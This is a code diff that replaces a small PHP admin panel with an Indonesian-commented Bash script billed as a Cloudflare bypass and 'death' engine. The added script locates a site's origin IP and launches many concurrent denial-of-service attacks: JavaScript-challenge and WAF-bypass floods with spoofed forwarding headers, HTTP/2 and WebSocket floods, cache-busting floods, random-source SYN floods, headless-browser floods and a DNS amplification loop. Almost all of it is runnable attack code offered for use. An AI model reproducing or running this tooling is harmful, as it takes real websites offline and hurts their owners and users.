@@ -1,871 +1,533 @@
-<?php
-session_start();
+#!/bin/bash
+# CF Bypass Death Ray - CloudFlare Penetrator
+# By: Ibu (Ex-Black Hat Master)
 
-// Konfigurasi Database
-$DB_HOST = "localhost";
-$DB_NAME = "admin_panel";
-$DB_USER = "root";
-$DB_PASS = "";
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
 
-// Koneksi Database
-try {
-    $pdo = new PDO("mysql:host=$DB_HOST;dbname=$DB_NAME", $DB_USER, $DB_PASS);
-    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+banner() {
+    clear
+    echo -e "${RED}"
+    echo "██████╗███████╗     ██████╗██╗  ██╗███████╗ █████╗ ████████╗██╗  ██╗"
+    echo "██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██║  ██║"
+    echo "██║     █████╗      ██║     ███████║█████╗  ███████║   ██║   ███████║"
+    echo "██║     ██╔══╝      ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██╔══██║"
+    echo "╚██████╗██║         ╚██████╗██║  ██║███████╗██║  ██║   ██║   ██║  ██║"
+    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
+    echo -e "${WHITE}           CLOUDFLARE BYPASS & DESTROY ENGINE v3.0${NC}"
+    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
+    echo ""
+}
+
+install_heavy_deps() {
+    echo -e "${YELLOW}[*] Menginstall dependencies berat...${NC}"
     
-    // Buat tabel users
-    $pdo->exec("CREATE TABLE IF NOT EXISTS users (
-        id INT PRIMARY KEY AUTO_INCREMENT,
-        username VARCHAR(50) UNIQUE NOT NULL,
-        password VARCHAR(255) NOT NULL,
-        role VARCHAR(20) DEFAULT 'user',
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )");
+    # Update system
+    apt-get update -y
+    apt-get upgrade -y
     
-    // Buat tabel servers
-    $pdo->exec("CREATE TABLE IF NOT EXISTS servers (
-        id INT PRIMARY KEY AUTO_INCREMENT,
-        name VARCHAR(100) NOT NULL,
-        ip_address VARCHAR(50),
-        status VARCHAR(20) DEFAULT 'active',
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )");
+    # Install basic tools
+    apt-get install -y curl wget git make cmake gcc g++ python3 python3-pip \
+        perl nmap masscan hping3 slowhttptest siege apache2-utils \
+        dnsutils tor proxychains4 netcat-openbsd socat \
+        openvpn stunnel4 haproxy nginx \
+        nodejs npm php php-curl php-sockets
     
-    // Cek apakah admin dengan ID 1 sudah ada
-    $stmt = $pdo->query("SELECT COUNT(*) FROM users WHERE id = 1");
-    if ($stmt->fetchColumn() == 0) {
-        // Buat admin default (ID 1 otomatis)
-        $password = password_hash("admin123", PASSWORD_DEFAULT);
-        $pdo->exec("INSERT INTO users (username, password, role) VALUES ('admin', '$password', 'admin')");
+    # Install Python libraries
+    pip3 install --upgrade pip
+    pip3 install requests scapy pyshark colorama asyncio aiohttp \
+        beautifulsoup4 selenium cloudscraper cfscrape pycurl \
+        fake-useragent python-whois dnspython concurrent-log-handler \
+        httpx http2 pyproxy twisted pyOpenSSL pycryptodome
+    
+    # Install Node.js tools
+    npm install -g puppeteer playwright cloudflare-bypasser \
+        http-flood slowloris golden-eye
+    
+    echo -e "${GREEN}[✓] Dependencies terinstall${NC}"
+}
+
+find_real_ip() {
+    target=$1
+    domain=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)
+    
+    echo -e "${BLUE}[+] Mencari IP asli $domain...${NC}"
+    
+    # Method 1: Historical DNS data
+    echo -e "${YELLOW}[*] Cek historical DNS...${NC}"
+    curl -s "https://securitytrails.com/domain/$domain/dns" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u >> /tmp/ips.txt
+    
+    # Method 2: Subdomain enumeration
+    echo -e "${YELLOW}[*] Subdomain enumeration...${NC}"
+    for sub in $(curl -s "https://crt.sh/?q=%25$domain&output=json" | grep -oP '(?<="name_value":")[^"]*' | sort -u); do
+        host $sub 2>/dev/null | grep "has address" | awk '{print $4}' >> /tmp/ips.txt
+    done
+    
+    # Method 3: SSL certificate logs
+    echo -e "${YELLOW}[*] Cek SSL certificates...${NC}"
+    curl -s "https://crt.sh/?q=$domain&output=json" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
+    
+    # Method 4: DNS brute force
+    echo -e "${YELLOW}[*] DNS brute force...${NC}"
+    for dns in 8.8.8.8 1.1.1.1 9.9.9.9; do
+        dig @$dns $domain A +short >> /tmp/ips.txt
+    done
+    
+    # Method 5: TXT records
+    echo -e "${YELLOW}[*] Cek TXT records...${NC}"
+    dig $domain TXT +short | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
+    
+    # Method 6: NS lookup
+    echo -e "${YELLOW}[*] NS lookup...${NC}"
+    nslookup $domain | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
+    
+    # Method 7: Scan open ports for origin server
+    echo -e "${YELLOW}[*] Scan origin server...${NC}"
+    masscan -p80,443,8080,8443 --rate 10000 --wait 0 --open-only $(curl -s ifconfig.me)/24 2>/dev/null | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
+    
+    # Clean and sort IPs
+    cat /tmp/ips.txt | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /tmp/real_ips.txt
+    
+    # Test each IP
+    while read ip; do
+        if curl -s -H "Host: $domain" http://$ip -I | grep -q "200\|301\|302"; then
+            echo -e "${GREEN}[✓] REAL IP FOUND: $ip${NC}"
+            echo $ip >> /tmp/confirmed_ips.txt
+        fi
+    done < /tmp/real_ips.txt
+    
+    if [ -f /tmp/confirmed_ips.txt ]; then
+        real_ip=$(head -1 /tmp/confirmed_ips.txt)
+        echo -e "${GREEN}[✓] IP asli: $real_ip${NC}"
+        return 0
+    else
+        echo -e "${RED}[✗] IP asli tidak ditemukan, lanjut dengan metode lain${NC}"
+        return 1
+    fi
+}
+
+bypass_cf_javascript() {
+    target=$1
+    
+    echo -e "${BLUE}[+] Bypass CF JavaScript challenge...${NC}"
+    
+    # Method 1: Cloudscraper
+    python3 -c "
+import cloudscraper
+import threading
+import time
+
+scraper = cloudscraper.create_scraper(
+    interpreter='js2py',
+    delay=0.1
+)
+
+def attack():
+    url = '$target'
+    while True:
+        try:
+            scraper.get(url, timeout=5)
+            scraper.post(url, data={'rand': str(time.time())})
+        except:
+            pass
+
+for i in range(100):
+    t = threading.Thread(target=attack)
+    t.daemon = True
+    t.start()
+    time.sleep(0.1)
+
+while True:
+    time.sleep(1)
+" 2>/dev/null &
+}
+
+bypass_cf_waf() {
+    target=$1
+    
+    echo -e "${BLUE}[+] Bypass CF WAF rules...${NC}"
+    
+    # Payload bypass WAF
+    python3 -c "
+import requests
+import threading
+import random
+
+url = '$target'
+
+headers_list = [
+    {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
+    {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
+    {'User-Agent': 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'},
+    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'},
+    {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36'}
+]
+
+def attack():
+    while True:
+        headers = random.choice(headers_list)
+        headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
+        headers['X-Real-IP'] = headers['X-Forwarded-For']
+        headers['CF-Connecting-IP'] = headers['X-Forwarded-For']
+        headers['X-Originating-IP'] = headers['X-Forwarded-For']
+        headers['X-Remote-IP'] = headers['X-Forwarded-For']
+        headers['X-Remote-Addr'] = headers['X-Forwarded-For']
+        
+        try:
+            requests.get(url, headers=headers, timeout=3)
+            requests.post(url, headers=headers, data={'waf_bypass': '/*!50000select*/ 1'}, timeout=3)
+        except:
+            pass
+
+for i in range(200):
+    t = threading.Thread(target=attack)
+    t.daemon = True
+    t.start()
+
+while True:
+    pass
+" 2>/dev/null &
+}
+
+http2_flood() {
+    target=$1
+    
+    echo -e "${BLUE}[+] HTTP/2 Rapid Reset Flood...${NC}"
+    
+    python3 -c "
+import httpx
+import asyncio
+import threading
+
+url = '$target'
+
+async def http2_flood():
+    async with httpx.AsyncClient(http2=True) as client:
+        while True:
+            tasks = []
+            for i in range(100):
+                tasks.append(client.get(url))
+                tasks.append(client.post(url, json={'data': i}))
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+def run_async():
+    asyncio.run(http2_flood())
+
+for i in range(50):
+    t = threading.Thread(target=run_async)
+    t.daemon = True
+    t.start()
+
+while True:
+    pass
+" 2>/dev/null &
+}
+
+websocket_flood() {
+    target=$1
+    
+    echo -e "${BLUE}[+] WebSocket Connection Flood...${NC}"
+    
+    python3 -c "
+import asyncio
+import websockets
+import threading
+
+uri = '$target'.replace('http', 'ws')
+
+async def ws_flood():
+    while True:
+        try:
+            async with websockets.connect(uri) as ws:
+                for i in range(1000):
+                    await ws.send('ping' * 1000)
+                    await ws.recv()
+        except:
+            pass
+
+def run_ws():
+    asyncio.run(ws_flood())
+
+for i in range(100):
+    t = threading.Thread(target=run_ws)
+    t.daemon = True
+    t.start()
+
+while True:
+    pass
+" 2>/dev/null &
+}
+
+cf_sslv2_bypass() {
+    target_ip=$1
+    target_domain=$2
+    
+    echo -e "${BLUE}[+] SSLv2 Bypass Attack...${NC}"
+    
+    # Exploit SSL/TLS handshake
+    while true; do
+        openssl s_client -connect $target_ip:443 -servername $target_domain -ssl2 -reconnect 2>/dev/null &
+        openssl s_client -connect $target_ip:443 -servername $target_domain -ssl3 -reconnect 2>/dev/null &
+        sleep 0.1
+    done
+}
+
+cf_origin_bypass() {
+    target_ip=$1
+    target_domain=$2
+    
+    echo -e "${BLUE}[+] Origin Server Direct Attack...${NC}"
+    
+    # Attack origin IP directly
+    while true; do
+        # HTTP direct
+        curl -s -H "Host: $target_domain" http://$target_ip -o /dev/null &
+        curl -s -H "Host: $target_domain" https://$target_ip -k -o /dev/null &
+        
+        # HTTPS direct with SNI
+        for port in 80 443 8080 8443 8888 9443; do
+            hping3 -S -p $port --flood $target_ip --rand-source &
+        done
+        
+        sleep 0.05
+    done
+}
+
+cf_cache_buster() {
+    target=$1
+    
+    echo -e "${BLUE}[+] Cache Buster Attack...${NC}"
+    
+    # Bypass cache with random parameters
+    python3 -c "
+import requests
+import threading
+import random
+import time
+
+url = '$target'
+
+paths = [
+    '/', '/index.php', '/index.html', '/index.aspx', '/wp-admin',
+    '/wp-content', '/api/v1', '/api/v2', '/graphql', '/rest',
+    '/products', '/product', '/category', '/shop', '/cart',
+    '/checkout', '/account', '/login', '/register', '/contact'
+]
+
+def cache_buster():
+    session = requests.Session()
+    while True:
+        for path in paths:
+            cache_buster = f'?cb={random.randint(1,999999999)}&t={time.time()}'
+            try:
+                session.get(url + path + cache_buster, timeout=2)
+                session.post(url + path, data={'cache': 'buster'}, timeout=2)
+            except:
+                pass
+
+for i in range(150):
+    t = threading.Thread(target=cache_buster)
+    t.daemon = True
+    t.start()
+
+while True:
+    time.sleep(0.1)
+" 2>/dev/null &
+}
+
+proxy_rotation() {
+    echo -e "${BLUE}[+] Proxy Rotator Active...${NC}"
+    
+    # Get fresh proxies
+    while true; do
+        curl -s "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all" > /tmp/proxies.txt
+        curl -s "https://www.proxy-list.download/api/v1/get?type=http" >> /tmp/proxies.txt
+        curl -s "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt" >> /tmp/proxies.txt
+        
+        sleep 300  # Update every 5 minutes
+    done
+}
+
+browser_emulation() {
+    target=$1
+    
+    echo -e "${BLUE}[+] Browser Emulation Attack...${NC}"
+    
+    # Puppeteer emulation
+    node -e "
+const puppeteer = require('puppeteer');
+const cluster = require('cluster');
+
+async function launchBrowser() {
+    const browser = await puppeteer.launch({
+        headless: true,
+        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security']
+    });
+    
+    const page = await browser.newPage();
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    
+    while (true) {
+        try {
+            await page.goto('$target', { waitUntil: 'networkidle0', timeout: 5000 });
+            await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
+            await page.waitForTimeout(1000);
+            await page.goto('$target' + '?' + Math.random(), { timeout: 5000 });
+        } catch(e) {}
     }
+}
+
+for (let i = 0; i < 50; i++) {
+    launchBrowser();
+}
+" 2>/dev/null &
+}
+
+ultimate_cf_death() {
+    target=$1
+    domain=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)
     
-} catch(PDOException $e) {
-    die("Koneksi database gagal: " . $e->getMessage());
-}
-
-// Fungsi cek login
-function isLogin() {
-    return isset($_SESSION['user_id']);
-}
-
-// Fungsi cek admin utama (ID 1)
-function isAdminUtama() {
-    return (isset($_SESSION['user_id']) && $_SESSION['user_id'] == 1);
-}
-
-// Proses Login
-if (isset($_POST['login'])) {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
+    echo -e "${PURPLE}╔════════════════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║        ULTIMATE CLOUDFLARE DEATH SEQUENCE        ║${NC}"
+    echo -e "${PURPLE}╚════════════════════════════════════════════════════╝${NC}"
     
-    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
-    $stmt->execute([$username]);
-    $user = $stmt->fetch();
+    # Step 1: Find real IP
+    find_real_ip $target
     
-    if ($user && password_verify($password, $user['password'])) {
-        $_SESSION['user_id'] = $user['id'];
-        $_SESSION['username'] = $user['username'];
-        $_SESSION['role'] = $user['role'];
-        header("Location: ".$_SERVER['PHP_SELF']);
-        exit();
-    } else {
-        $error = "Username atau password salah!";
-    }
-}
-
-// Proses Logout
-if (isset($_GET['logout'])) {
-    session_destroy();
-    header("Location: ".$_SERVER['PHP_SELF']);
-    exit();
-}
-
-// Proses Tambah User (hanya admin utama)
-if (isAdminUtama() && isset($_POST['tambah_user'])) {
-    $username = $_POST['username'];
-    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
-    $role = $_POST['role'];
+    # Step 2: Start proxy rotation
+    proxy_rotation &
     
-    $stmt = $pdo->prepare("INSERT INTO users (username, password, role) VALUES (?, ?, ?)");
-    $stmt->execute([$username, $password, $role]);
-    header("Location: ".$_SERVER['PHP_SELF']."?page=users");
-    exit();
-}
-
-// Proses Hapus User (hanya admin utama)
-if (isAdminUtama() && isset($_GET['hapus_user'])) {
-    $id = $_GET['hapus_user'];
-    if ($id != 1) {
-        $stmt = $pdo->prepare("DELETE FROM users WHERE id = ?");
-        $stmt->execute([$id]);
-    }
-    header("Location: ".$_SERVER['PHP_SELF']."?page=users");
-    exit();
-}
-
-// Proses Tambah Server (semua user)
-if (isLogin() && isset($_POST['tambah_server'])) {
-    $name = $_POST['name'];
-    $ip = $_POST['ip_address'];
+    # Step 3: Launch all bypass methods
+    if [ -f /tmp/confirmed_ips.txt ]; then
+        while read real_ip; do
+            echo -e "${GREEN}[+] Attacking origin: $real_ip${NC}"
+            cf_origin_bypass $real_ip $domain &
+        done < /tmp/confirmed_ips.txt
+    fi
     
-    $stmt = $pdo->prepare("INSERT INTO servers (name, ip_address) VALUES (?, ?)");
-    $stmt->execute([$name, $ip]);
-    header("Location: ".$_SERVER['PHP_SELF']."?page=servers");
-    exit();
-}
-
-// Proses Hapus Server (semua user)
-if (isLogin() && isset($_GET['hapus_server'])) {
-    $stmt = $pdo->prepare("DELETE FROM servers WHERE id = ?");
-    $stmt->execute([$_GET['hapus_server']]);
-    header("Location: ".$_SERVER['PHP_SELF']."?page=servers");
-    exit();
-}
-
-// Proses Edit Server (semua user)
-if (isLogin() && isset($_POST['edit_server'])) {
-    $id = $_POST['id'];
-    $name = $_POST['name'];
-    $ip = $_POST['ip_address'];
-    $status = $_POST['status'];
+    # Step 4: Launch CF bypass attacks
+    bypass_cf_javascript "$target" &
+    bypass_cf_waf "$target" &
+    http2_flood "$target" &
+    websocket_flood "$target" &
+    cf_cache_buster "$target" &
+    browser_emulation "$target" &
     
-    $stmt = $pdo->prepare("UPDATE servers SET name=?, ip_address=?, status=? WHERE id=?");
-    $stmt->execute([$name, $ip, $status, $id]);
-    header("Location: ".$_SERVER['PHP_SELF']."?page=servers");
-    exit();
+    # Step 5: SSL/TLS exploitation
+    for ip in $(cat /tmp/confirmed_ips.txt 2>/dev/null); do
+        cf_sslv2_bypass $ip $domain &
+    done
+    
+    # Step 6: DNS amplification through CF
+    python3 -c "
+import socket
+import random
+import threading
+import time
+
+target = '$domain'
+
+def dns_amp():
+    servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
+    while True:
+        for server in servers:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            query = b'\\xdb\\x42\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01' + \
+                   target.encode() + b'\\x00\\x00\\xff\\x00\\x01\\x00\\x00)\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
+            sock.sendto(query, (server, 53))
+
+for i in range(100):
+    t = threading.Thread(target=dns_amp)
+    t.daemon = True
+    t.start()
+" 2>/dev/null &
+    
+    echo -e "${GREEN}[✓] SEMUA BYPASS METHOD AKTIF${NC}"
+    echo -e "${YELLOW}[!] Target: $domain akan tumbang dalam hitungan detik${NC}"
 }
 
-// Halaman yang aktif
-$page = isset($_GET['page']) ? $_GET['page'] : 'users';
-if (isAdminUtama() && $page == '') {
-    $page = 'dashboard';
+monitor_cf_bypass() {
+    target=$1
+    
+    echo -e "${BLUE}[+] Monitoring bypass progress...${NC}"
+    
+    while true; do
+        # Check if CF blocking is weakening
+        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 "$target")
+        
+        case $response in
+            200|301|302)
+                echo -e "${GREEN}[✓] BYPASS SUKSES! HTTP $response${NC}"
+                ;;
+            403|503)
+                echo -e "${YELLOW}[!] Still blocked by CF...${NC}"
+                ;;
+            *)
+                echo -e "${RED}[?] Unknown response: $response${NC}"
+                ;;
+        esac
+        
+        sleep 5
+    done
 }
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Admin Panel</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        
-        body {
-            background: #f0f2f5;
-        }
-        
-        /* Login Page */
-        .login-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-        }
-        
-        .login-box {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            width: 400px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-        }
-        
-        .login-box h2 {
-            text-align: center;
-            margin-bottom: 30px;
-            color: #333;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-        }
-        
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        
-        .btn {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        
-        .btn-primary {
-            background: #667eea;
-            color: white;
-            width: 100%;
-            font-size: 16px;
-        }
-        
-        .btn-primary:hover {
-            background: #5a67d8;
-        }
-        
-        .btn-success {
-            background: #28a745;
-            color: white;
-        }
-        
-        .btn-warning {
-            background: #ffc107;
-            color: #333;
-        }
-        
-        .btn-danger {
-            background: #dc3545;
-            color: white;
-        }
-        
-        .btn-secondary {
-            background: #6c757d;
-            color: white;
-        }
-        
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        /* Navbar */
-        .navbar {
-            background: white;
-            padding: 15px 30px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .nav-brand {
-            font-size: 20px;
-            font-weight: bold;
-            color: #333;
-        }
-        
-        .nav-brand span {
-            color: #667eea;
-        }
-        
-        .nav-menu {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-        
-        .nav-menu a {
-            text-decoration: none;
-            color: #555;
-            padding: 8px 15px;
-            border-radius: 5px;
-        }
-        
-        .nav-menu a:hover, .nav-menu a.active {
-            background: #667eea;
-            color: white;
-        }
-        
-        .user-info {
-            background: #f0f0f0;
-            padding: 8px 15px;
-            border-radius: 20px;
-            color: #333;
-            margin: 0 10px;
-        }
-        
-        .badge {
-            padding: 3px 8px;
-            border-radius: 3px;
-            font-size: 11px;
-            font-weight: bold;
-            margin-left: 5px;
-        }
-        
-        .badge-danger {
-            background: #dc3545;
-            color: white;
-        }
-        
-        .badge-warning {
-            background: #ffc107;
-            color: #333;
-        }
-        
-        /* Container */
-        .container {
-            max-width: 1200px;
-            margin: 20px auto;
-            padding: 0 20px;
-        }
-        
-        /* Card */
-        .card {
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #eee;
-        }
-        
-        /* Table */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        
-        th {
-            background: #f8f9fa;
-            padding: 12px;
-            text-align: left;
-            border-bottom: 2px solid #dee2e6;
-        }
-        
-        td {
-            padding: 12px;
-            border-bottom: 1px solid #dee2e6;
-        }
-        
-        .status {
-            padding: 3px 8px;
-            border-radius: 3px;
-            font-size: 12px;
-            display: inline-block;
-        }
-        
-        .status-active {
-            background: #d4edda;
-            color: #155724;
-        }
-        
-        .status-inactive {
-            background: #f8d7da;
-            color: #721c24;
-        }
-        
-        /* Info Box */
-        .info-box {
-            background: #e7f3ff;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            border-left: 4px solid #17a2b8;
-        }
-        
-        .welcome-box {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            border-left: 4px solid #667eea;
-        }
-        
-        .system-info {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        
-        .system-info a {
-            color: white;
-        }
-        
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal.active {
-            display: flex;
-        }
-        
-        .modal-content {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            width: 500px;
-            max-width: 90%;
-        }
-        
-        .modal-content h3 {
-            margin-bottom: 20px;
-        }
-        
-        .modal-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: flex-end;
-            margin-top: 20px;
-        }
-        
-        /* Dashboard */
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .stat-card {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-        }
-        
-        .stat-card h4 {
-            margin-bottom: 10px;
-            font-size: 16px;
-        }
-        
-        .stat-card p {
-            font-size: 30px;
-            font-weight: bold;
-        }
-        
-        /* Menu Grid */
-        .menu-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
-        }
-        
-        .menu-item {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        
-        .menu-item h4 {
-            margin-bottom: 10px;
-            color: #333;
-        }
-        
-        .menu-item p {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-    </style>
-</head>
-<body>
-    <?php if (!isLogin()): ?>
-        <!-- Halaman Login -->
-        <div class="login-container">
-            <div class="login-box">
-                <h2>🔐 Login Admin Panel</h2>
-                <?php if (isset($error)): ?>
-                    <div class="error"><?php echo $error; ?></div>
-                <?php endif; ?>
-                <form method="post">
-                    <div class="form-group">
-                        <label>Username</label>
-                        <input type="text" name="username" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Password</label>
-                        <input type="password" name="password" required>
-                    </div>
-                    <button type="submit" name="login" class="btn btn-primary">Login</button>
-                </form>
-                <p style="text-align: center; margin-top: 20px; color: #666; font-size: 14px;">
-                    <strong>Default:</strong> admin / admin123
-                </p>
-            </div>
-        </div>
-    <?php else: ?>
-        <!-- Navbar -->
-        <div class="navbar">
-            <div class="nav-brand">
-                Pterodactyl <span>Panel</span>
-            </div>
-            <div class="nav-menu">
-                <?php if (isAdminUtama()): ?>
-                    <a href="?page=dashboard" class="<?php echo ($page == 'dashboard') ? 'active' : ''; ?>">Dashboard</a>
-                <?php endif; ?>
-                <a href="?page=users" class="<?php echo ($page == 'users') ? 'active' : ''; ?>">Users</a>
-                <a href="?page=servers" class="<?php echo ($page == 'servers') ? 'active' : ''; ?>">Servers</a>
-                <?php if (isAdminUtama()): ?>
-                    <a href="?page=all" class="<?php echo ($page == 'all') ? 'active' : ''; ?>">All Menu</a>
-                <?php endif; ?>
-                <span class="user-info">
-                    👤 <?php echo $_SESSION['username']; ?>
-                    <?php if (isAdminUtama()): ?>
-                        <span class="badge badge-danger">Admin Utama</span>
-                    <?php elseif ($_SESSION['role'] == 'admin'): ?>
-                        <span class="badge badge-warning">Admin</span>
-                    <?php endif; ?>
-                </span>
-                <a href="?logout=1" class="btn btn-danger" style="color: white;">Logout</a>
-            </div>
-        </div>
-        
-        <div class="container">
-            <!-- System Info -->
-            <div class="system-info">
-                <strong>⚠️ System:</strong> Pterodactyl Panel 1.12.1 | 
-                <a href="#">GitHub</a> | Copyright © 2025
-            </div>
-            
-            <!-- Welcome Message -->
-            <div class="welcome-box">
-                <strong>Selamat datang, <?php echo $_SESSION['username']; ?>!</strong><br>
-                <?php if (isAdminUtama()): ?>
-                    Anda login sebagai <strong>Admin Utama (ID: 1)</strong> - Akses Penuh
-                <?php else: ?>
-                    Anda login sebagai <strong><?php echo ucfirst($_SESSION['role']); ?> (ID: <?php echo $_SESSION['user_id']; ?>)</strong>
-                <?php endif; ?>
-            </div>
-            
-            <!-- Info untuk non-admin utama -->
-            <?php if (!isAdminUtama()): ?>
-            <div class="info-box">
-                <strong>ℹ️ Info Akses:</strong> 
-                - Users: Hanya bisa melihat (tidak bisa edit/hapus)<br>
-                - Servers: Bisa tambah/edit/hapus
-            </div>
-            <?php endif; ?>
-            
-            <!-- Halaman Dashboard (khusus admin utama) -->
-            <?php if ($page == 'dashboard' && isAdminUtama()): ?>
-                <div class="card">
-                    <div class="card-header">
-                        <h2>📊 Dashboard</h2>
-                    </div>
-                    <?php
-                    $totalUsers = $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
-                    $totalServers = $pdo->query("SELECT COUNT(*) FROM servers")->fetchColumn();
-                    $totalAdmins = $pdo->query("SELECT COUNT(*) FROM users WHERE role='admin'")->fetchColumn();
-                    $activeServers = $pdo->query("SELECT COUNT(*) FROM servers WHERE status='active'")->fetchColumn();
-                    ?>
-                    <div class="stats">
-                        <div class="stat-card">
-                            <h4>Total Users</h4>
-                            <p><?php echo $totalUsers; ?></p>
-                        </div>
-                        <div class="stat-card" style="background: linear-gradient(135deg, #28a745, #20c997);">
-                            <h4>Total Servers</h4>
-                            <p><?php echo $totalServers; ?></p>
-                        </div>
-                        <div class="stat-card" style="background: linear-gradient(135deg, #ffc107, #fd7e14);">
-                            <h4>Total Admins</h4>
-                            <p><?php echo $totalAdmins; ?></p>
-                        </div>
-                        <div class="stat-card" style="background: linear-gradient(135deg, #17a2b8, #6f42c1);">
-                            <h4>Active Servers</h4>
-                            <p><?php echo $activeServers; ?></p>
-                        </div>
-                    </div>
-                </div>
-            <?php endif; ?>
-            
-            <!-- Halaman Users -->
-            <?php if ($page == 'users'): ?>
-                <div class="card">
-                    <div class="card-header">
-                        <h2>👥 Manajemen Users</h2>
-                        <?php if (isAdminUtama()): ?>
-                            <button class="btn btn-success" onclick="openModal('modalUser')">+ Tambah User</button>
-                        <?php endif; ?>
-                    </div>
-                    
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>ID</th>
-                                <th>Username</th>
-                                <th>Role</th>
